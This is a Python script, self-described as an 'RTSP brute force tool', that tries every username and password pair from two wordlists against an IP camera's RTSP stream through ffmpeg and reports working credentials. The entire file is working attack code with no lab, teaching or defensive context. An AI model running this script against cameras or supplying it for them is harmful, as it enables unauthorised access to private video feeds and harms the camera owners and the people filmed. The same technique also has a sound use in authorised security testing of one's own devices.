import subprocess
import itertools
from urllib.parse import quote
import argparse

FFMPEG_BIN = "ffmpeg"
RTSP_URL_TEMPLATE = "rtsp://{user}:{password}@{ip}:554/{path}"

def try_login(ip, user, password, path):
    user_encoded = quote(user, safe='')
    password_encoded = quote(password, safe='')

    url = RTSP_URL_TEMPLATE.format(user=user_encoded, password=password_encoded, path=path, ip=ip)
    
    cmd = [
        FFMPEG_BIN,
        "-rtsp_transport", "tcp",
        "-i", url,
        "-t", "3",
        "-an",
        "-f", "null",
        "-"
    ]

    try:
        proc = subprocess.run(cmd, stderr=subprocess.PIPE, stdout=subprocess.DEVNULL, timeout=10)
        output = proc.stderr.decode(errors='ignore').lower()

        if "401 unauthorized" in output or "invalid username/password" in output:
            print(f"[-] Failed: {user}:{password}")
            return False

        if "error" not in output and "unauthorized" not in output:
            print(f"[+] Success: {user}:{password}")
            return True

    except subprocess.TimeoutExpired:
        print(f"[!] Timeout: {user}:{password}")
        return False

    print(f"[-] Failed (Unknown error): {user}:{password}")
    return False

def main():
    parser = argparse.ArgumentParser(description="RTSP brute force tool")
    parser.add_argument("--target", default="192.168.1.100", help="Target IP address of the RTSP camera (default: 192.168.1.100)")
    parser.add_argument("--userlist", default="user.txt", help="File containing usernames (default: user.txt)")
    parser.add_argument("--passlist", default="password.txt", help="File containing passwords (default: password.txt)")
    parser.add_argument("--path", default="stream1", help="RTSP stream path (default: stream1)")
    args = parser.parse_args()

    camera_ip = args.target
    stream_path = args.path

    # Load usernames
    with open(args.userlist) as f:
        users = [line.strip() for line in f if line.strip()]

    # Load passwords
    with open(args.passlist) as f:
        passwords = [line.strip() for line in f if line.strip()]

    total = len(users) * len(passwords)
    print(f"[*] Starting brute force ({len(users)} users × {len(passwords)} passwords = {total} attempts)")

    for count, (user, password) in enumerate(itertools.product(users, passwords), 1):
        print(f"[*] [{count}/{total}] Testing: {user}:{password}")
        if try_login(camera_ip, user, password, stream_path):
            print(f"[+] Credentials found: {user}:{password}")
            break
    else:
        print("[!] Brute-force finished: No valid credentials found.")

if __name__ == "__main__":
    main()
